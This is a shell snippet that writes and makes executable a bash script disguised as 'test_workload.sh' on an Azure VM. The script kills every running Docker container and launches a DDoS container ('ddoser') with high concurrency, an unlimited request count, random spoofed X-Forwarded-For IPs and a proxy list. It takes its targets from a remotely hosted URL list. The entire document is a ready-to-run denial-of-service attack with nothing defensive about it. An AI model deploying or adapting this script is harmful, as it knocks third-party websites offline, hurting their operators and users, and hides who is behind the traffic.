echo '#!/usr/bin/env bash

# BEGIN VARS
LOG_DIR="/home/azureuser/log"
LOG_PATH="$LOG_DIR/nukem.log"  # nukem run log path
LOG_RETENTION=10            # how many logs to keep
BACKUP_SUFFIX=$(date +"%F_%H%M") # log retention suffix

# DDOSER_VARS
TARG_URL="https://raw.githubusercontent.com/hem017/cytro/master/targets_all.txt"
USER_AGENTS="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36"


# BEGIN FUNCTIONS
#rotate logs
rotate_file () {
    BACKUP_FILE="$1"
    NUM_BACKUPS="$2"
    COMPONENT_NAME="$3"
    if [ -f $BACKUP_FILE ]; then
        mv -v $BACKUP_FILE ${BACKUP_FILE}${BACKUP_SUFFIX} | tee -a $LOG_PATH
    fi
    echo "$(date +"%F %H:%M:%S:%s") keeping last $NUM_BACKUPS $COMPONENT_NAME" | tee -a $LOG_PATH
    RETAIN="$(ls -tr1 ${BACKUP_FILE}* | tail -n $NUM_BACKUPS)"
    for f in ${BACKUP_FILE}* ; do
        if [ -z "$(echo $RETAIN | grep $f)" ]; then
            rm -v $f | tee -a $LOG_PATH
        fi
    done
}

# END FUNCTIONS

# creating new log and rotating
mkdir -p $LOG_DIR
rotate_file "${LOG_PATH}" $LOG_RETENTION "logs"
echo -e "==== START $(date +"%F %H:%M") ====\n" | tee -a $LOG_PATH

if [ -n "$(docker ps -q)" ]; then
  docker kill $(docker ps -q) 2>&1 | tee -a $LOG_PATH
fi
docker run --pull always \
        --ulimit nofile=100000:100000 \
        -d --rm imsamurai/ddoser \
        --concurrency 150 \
        --timeout 60 \
        --with-random-get-param \
        --user-agent "$USER_AGENTS" \
        --count 0 \
        --log-to-stdout \
        --target-urls-file $TARG_URL \
        --proxy-url "http://143.244.166.15/proxy.list" \
        --restart-period 600 \
        --random-xff-ip | tee -a $LOG_PATH' > /home/azureuser/test_workload.sh

chmod +x /home/azureuser/test_workload.sh

